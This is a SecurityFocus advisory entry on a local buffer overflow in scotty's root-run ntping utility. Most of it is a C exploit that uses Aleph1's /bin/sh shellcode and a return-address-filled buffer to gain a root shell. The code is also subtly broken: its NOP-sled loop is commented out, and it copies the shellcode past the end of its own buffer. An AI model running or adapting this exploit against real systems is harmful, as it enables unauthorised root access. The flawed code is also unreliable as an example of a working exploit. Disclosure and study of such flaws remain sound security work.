source: http://www.securityfocus.com/bid/2911/info

ntping is a component of scotty, a Tcl interpreter used to retrieve status and configuration information for TCP/IP networks. The utility, which runs with root privileges, contains a locally exploitable buffer overflow vulnerability. A local attacker can supply a long string as a command line argument to ntping, which, if the argument is of sufficient length (approximately 9000 characters) will induce a segfault.

If the input is carefully constructed, a local attacker can exploit this vulnerability to execute arbitrary code on the target host. 

/*Larry W. Cashdollar                6/13/2001
  http://vapid.dhs.org               Vapid Labs
  Overflows ntping for scotty-2.1.9 based on post by
  dotslash@snosoft.com*/

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90		/*no operation skip to next instruction. */
#define LEN 590			/*our buffersize. */

/*lacks a call to setuid(0)*/
char shellcode[]= /*Aleph1's shell code. */
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

/*Nab the stack pointer to use as an index into our nop's*/
long
get_sp ()
{
  __asm__ ("mov %esp, %eax");
}

int
main (int argc, char *argv[])
{
  char buffer[LEN];
  int i;

  long retaddr = get_sp ();

/*Fill the buffer with our new address to jump to esp + offset */
  for (i = 0; i < LEN; i += 4)
    *(long *) &buffer[i] = retaddr + atoi (argv[1]);

/*copy the NOPs  in to the buffer leaving space for shellcode and
pointers*/

  printf ("Jumping to address %x BufSize %d\n", retaddr + atoi (argv[1]),LEN);
/*
  for (i = 0; i < (LEN - strlen (shellcode) - 100); i++)
    *(buffer + i) = NOP;*/

/*copy the shell code into the buffer*/
  memcpy (buffer + i, shellcode, strlen (shellcode));

  execl ("/usr/sbin/ntping", "ntping", buffer,0, 0);

}